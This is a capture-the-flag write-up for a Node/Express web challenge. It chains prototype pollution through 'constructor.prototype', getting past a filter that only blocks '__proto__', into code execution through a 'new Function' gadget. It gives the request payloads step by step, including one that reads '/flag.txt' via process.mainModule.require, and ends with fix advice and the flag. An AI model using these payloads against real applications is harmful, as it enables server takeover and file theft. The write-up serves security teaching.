# Ouroboros

Web, 79 points, 110 solves. A Node 20 / Express report builder with a
password-less login, a branding config saved through a deep merge, and a preview
that renders a fixed template. The description insists the one dangerous thing
you are thinking of is already filtered.

## What you are given

The portal supplies `<challenge-host>` and `<port>` for the instance. No files
are attached. The app has one page with a settings box (labelled "Settings
(JSON, deep-merged)"), a title field, a body field and a render button. The
browser talks to three endpoints:

```
POST /api/login            {"username":"..."}      starts a session
POST /api/report/config    {"settings":{...}}      deep-merges into a global config
POST /api/report/preview   {"data":{"title","body"}}  renders the template
```

Login takes no password. The preview returns a fixed skeleton with an `h1` for
the title, a `small` footer, a `div` for the body and an empty
`div class="computed"`.

## Reproduction

1. Log in and confirm the template. After `POST /api/login` with any username,
   `POST /api/report/preview` with `{"data":{"title":"T","body":"B"}}` returns
   the skeleton above. Title and body are string-coerced and HTML-escaped, so
   markup in them is inert. The computed div is empty in every normal render.

2. Send a literal `__proto__` payload and note that it is accepted but does
   nothing visible:

   ```
   POST /api/report/config  {"settings":{"__proto__":{"x":"y"}}}
   ```

   HTTP 200. This is the filter the description hints at: the key `__proto__`
   is dropped before the merge.

3. Build a crash oracle for real pollution. First merge a string onto a key
   through the constructor path:

   ```
   POST /api/report/config  {"settings":{"constructor":{"prototype":{"K":"str"}}}}
   ```

   Then merge an object at the same key:

   ```
   POST /api/report/config  {"settings":{"K":{"nested":1}}}
   ```

   The recursive merge reaches `merge(target[K], source[K])` where `target[K]`
   is now a string, and the request returns 500. The same pair of requests using
   `__proto__` in place of `constructor.prototype` stays at 200. So
   `constructor.prototype` lands on `Object.prototype` and the literal
   `__proto__` key does not.

4. Explain why the obvious oracle looks dead. The render context for the preview
   is created with a null prototype, so `title`, `body` and `computed` do not
   inherit polluted properties. Polluting `Object.prototype.title` changes
   nothing in the output, which is why earlier attempts concluded pollution had
   not happened.

5. Find the gadget that does inherit. The computed slot is produced from a plain
   object that does inherit, roughly
   `computed = String((new Function(ctx.formula))())`. Normal renders leave the
   slot empty. Pollute `formula` and the body becomes the code. A statement with
   no return prints `undefined`; a plain value prints a formula error:

   ```
   {"settings":{"constructor":{"prototype":{"formula":"7*7"}}}}        -> undefined
   {"settings":{"constructor":{"prototype":{"formula":"return 6*7"}}}} -> 42
   ```

   The second one is code execution inside the preview.

6. Read the flag. `require` is not in scope inside the `Function` body, but
   `process.mainModule.require` is. The root directory held both `flag` and
   `flag.txt`; the payload below read `/flag.txt`:

   ```
   POST /api/login           {"username":"x"}
   POST /api/report/config   {"settings":{"constructor":{"prototype":{"formula":
     "return process.mainModule.require('fs').readFileSync('/flag.txt','utf8')"}}}}
   POST /api/report/preview  {"data":{"title":"T","body":"B"}}
   ```

   The flag appears inside `div class="computed"`. The local record does not say
   what `/flag` contained, only that `/flag.txt` was the file read.

7. Note what is reconstructed and what is observed. The endpoint names, the
   filter on `__proto__`, the 500 versus 200 crash-oracle behaviour, the
   `7*7`/`return 6*7` contrast and the final read are all recorded in the
   challenge directory. The exact merge helper and the exact preview source were
   never available, so the `new Function(ctx.formula)` line is a reconstruction
   from observed behaviour, not quoted code.

The submission log has a `goodFlag` row for Ouroboros with no mechanism string,
so the chain above comes from the local writeup and the recorded probe results.
The flag text itself names the same path.

## Why it works

A recursive merge that follows `constructor` into `prototype` reaches
`Object.prototype`, and the guard only blocks the literal string `__proto__`.
The application then reads an evaluation seed off a plain object that inherits
from `Object.prototype`, so a configuration write can set a property the
renderer treats as code. `new Function` is an eval primitive, and
`process.mainModule.require` reaches the filesystem from inside it. Filtering
one spelling of the prototype key is not a defence. The merge should reject
`constructor` and `prototype` as path segments, use a null-prototype target or a
`Map`, and the renderer should never evaluate configuration values.

## Flag

```
hiCTF{pr0to_pollution_to_cust0m_new_Function_gadget_rce_50bad32d63}
```
